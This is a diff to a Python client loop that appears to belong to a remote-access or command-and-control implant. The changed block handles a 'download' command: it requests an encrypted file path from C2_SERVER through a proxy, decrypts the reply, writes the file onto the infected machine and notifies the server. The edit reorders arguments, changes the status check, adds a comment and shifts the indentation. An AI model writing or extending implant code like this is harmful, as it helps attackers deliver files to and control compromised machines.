@@ -67,11 +67,12 @@ while True:
             filepath = cmd.split()[2] # command client download FILENAME
             filename = filepath.rsplit("/", 1)[-1] 
             encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
-            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", headers=HEADER, stream=True, proxies=PROXY) as response:
-                if response.status_code == HTTPStatusCode.OK:
-                    with open(filename, "wb") as file_handle:
-                        file_handle.write(cipher.decrypt(response.content))
-                    post_to_server(f"{filename} is now on {client}.\n")
+            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
+                    if response.status_code == HTTPStatusCode.OK.value:
+                        with open(filename, "wb") as file_handle:
+                            # Decrypt the response content and write the file out to disk, then notify us on the server
+                            file_handle.write(cipher.decrypt(response.content))
+                        post_to_server(f"{filename} is now on {client}.\n")
         except IndexError:
             post_to_server("You must enter the filename to download.")
         except (FileNotFoundError, PermissionError, OSError):
